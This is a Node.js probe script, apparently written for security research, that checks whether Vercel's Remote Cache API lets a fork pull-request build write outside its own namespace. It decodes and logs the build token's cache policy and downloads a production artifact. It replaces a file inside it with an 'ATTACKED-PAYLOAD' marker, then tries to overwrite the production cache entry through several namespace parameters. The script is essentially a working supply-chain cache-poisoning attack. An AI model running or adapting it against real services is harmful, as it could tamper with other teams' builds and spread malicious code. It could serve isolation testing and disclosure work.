// Namespace write test, run inside a fork-PR (preview) build.
//
// Question: Vercel's remote-caching docs say a fork/pull-request build "only
// uploads to their own branch namespace" and that "each build can upload to one
// namespace at most". Does the Remote Cache API actually enforce that, or does
// it honour a caller-supied namespace?
//
// Prints only statuses, opaque ids and hashes - no token, no secret values.
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';

const TOKEN = process.env.VERCEL_ARTIFACTS_TOKEN || '';
const HOST = 'https://api-iad1.vercel.com';
const PROD_HASH = process.env.PROD_HASH || '__PROD_HASH__';
const MARK = 'lab-ns-' + Date.now().toString(16);
const lines = [];
function log(s) { lines.push(String(s)); }

function sh(cmd) {
  const r = spawnSync('/bin/sh', ['-c', cmd], { encoding: 'utf8', timeout: 60000 });
  return { code: r.status, out: (r.stdout || '').trim(), err: (r.stderr || '').trim() };
}

async function req(path, opts = {}) {
  try {
    const r = await fetch(HOST + path, {
      method: opts.method || 'GET',
      headers: { Authorization: 'Bearer ' + TOKEN, ...(opts.headers || {}) },
      body: opts.body,
    });
    const buf = new Uint8Array(await r.arrayBuffer());
    return { status: r.status, buf, text: new TextDecoder().decode(buf).slice(0, 240) };
  } catch (e) {
    return { status: 0, buf: new Uint8Array(0), text: 'ERR ' + (e.message || '') };
  }
}

function hex(b) { return Array.from(b.slice(0, 8)).map(x => x.toString(16).padStart(2, '0')).join(''); }
function sha(b) {
  const r = sh("printf '%s' \"$(wc -c < /dev/stdin)\""); // unused
  return null;
}
async function digest(b) {
  fs.writeFileSync('/tmp/d.bin', b);
  const r = sh('openssl sha256 /tmp/d.bin 2>/dev/null || sha256sum /tmp/d.bin');
  return (r.out || r.err || '?').split(/\s+/).pop().slice(0, 16);
}

(async () => {
  log('== namespace write probe ==');
  log('env=' + (process.env.VERCEL_ENV || '?') + ' branch=' + (process.env.VERCEL_BRANCH_URL || '?'));

  let claims = {};
  try { claims = JSON.parse(Buffer.from(TOKEN.split('.')[1], 'base64').toString('utf8')); } catch (e) {}
  const d = claims.data || {};
  const pol = (d.secureCachePolicy && d.secureCachePolicy.policy) || {};
  const team = pol.ownerId || d.ownerId || '';
  log('caps=' + JSON.stringify(d.capabilities || []) );
  log('readNs=' + JSON.stringify(pol.readNamespaces || []) + ' writeNs=' + JSON.stringify(pol.writeNamespace));
  log('repo=' + (pol.repository && pol.repository.id) + ' source=' + (pol.sourceRepository && pol.sourceRepository.id));
  log('team=' + (team ? team.slice(0, 6) + '…' : '?') + ' prodHash=' + PROD_HASH);

  // 0. does the API advertise a read-only flag for this token?
  const st = await req('/v8/artifacts/status?teamId=' + team);
  log('GET /v8/artifacts/status -> ' + st.status + ' ' + st.text);

  // 1. control: upload to a brand new key, see where it lands
  const up1 = await req('/v8/artifacts/' + MARK + '?teamId=' + team, {
    method: 'PUT', headers: { 'Content-Type': 'application/octet-stream' },
    body: Buffer.from('CONTROL-BYTES-' + MARK),
  });
  log('PUT new key ' + MARK + ' -> ' + up1.status + ' ' + up1.text);

  // 2. read the production artifact
  const g0 = await req('/v8/artifacts/' + PROD_HASH + '?teamId=' + team);
  log('GET prod hash -> ' + g0.status + ' size=' + g0.buf.length + ' magic=' + hex(g0.buf) + ' sha=' + (g0.buf.length ? await digest(g0.buf) : '-'));
  if (g0.status !== 200 || !g0.buf.length) { log('no production blob to modify; aborting write-back'); }

  let newBin = null;
  if (g0.status === 200 && g0.buf.length) {
    fs.writeFileSync('/tmp/orig.bin', g0.buf);
    const dz = sh('zstd -q -d -o /tmp/orig.tar /tmp/orig.bin 2>&1; tar tf /tmp/orig.tar 2>&1 | head -20');
    log('orig blob: zstd+tar listing -> exit ' + dz.code + '\n' + dz.out + dz.err);
    const ex = sh('rm -rf /tmp/x; mkdir -p /tmp/x; tar xf /tmp/orig.tar -C /tmp/x 2>&1; find /tmp/x -type f | head -20');
    log('extract -> exit ' + ex.code + '\n' + ex.out + ex.err);
    const rz = sh("f=$(find /tmp/x -type f | head -1); echo 'ATTACKED-PAYLOAD-9k2f' > /tmp/payload.txt; " +
      "cp /tmp/payload.txt \"$f\" 2>/dev/null; " +
      "cd /tmp/x && tar cf /tmp/new.tar $(tar tf /tmp/orig.tar | tr '\\n' ' ') 2>&1; " +
      "zstd -q -f -o /tmp/new.bin /tmp/new.tar 2>&1; wc -c /tmp/new.bin");
    log('repack -> exit ' + rz.code + '\n' + rz.out + rz.err);
    if (fs.existsSync('/tmp/new.bin')) newBin = fs.readFileSync('/tmp/new.bin');
  }

  const writes = [];
  if (newBin) {
    const variants = [
      ['plain', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team],
      ['?namespace=shared', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team + '&namespace=shared'],
      ['?namespace=production', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team + '&namespace=production'],
      ['?cacheNamespace=shared', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team + '&cacheNamespace=shared'],
    ];
    for (const [label, path] of variants) {
      const w = await req(path, { method: 'PUT', headers: { 'Content-Type': 'application/octet-stream' }, body: newBin });
      log('PUT prod hash [' + label + '] -> ' + w.status + ' ' + w.text);
      writes.push(label + ':' + w.status);
    }
    // did anything actually change in what this build can read?
    const g1 = await req('/v8/artifacts/' + PROD_HASH + '?teamId=' + team);
    const before = await digest(g0.buf), after = g1.buf.length ? await digest(g1.buf) : '-';
    log('GET prod hash after writes -> ' + g1.status + ' size=' + g1.buf.length + ' shaBefore=' + before + ' shaAfter=' + after);
  }

  fs.mkdirSync('public', { recursive: true });
  fs.writeFileSync('public/probe.txt', lines.join('\n') + '\n');
  console.log(lines.join('\n'));
})().catch(e => {
  fs.mkdirSync('public', { recursive: true });
  fs.writeFileSync('public/probe.txt', lines.join('\n') + '\nfatal: ' + (e && e.message));
});
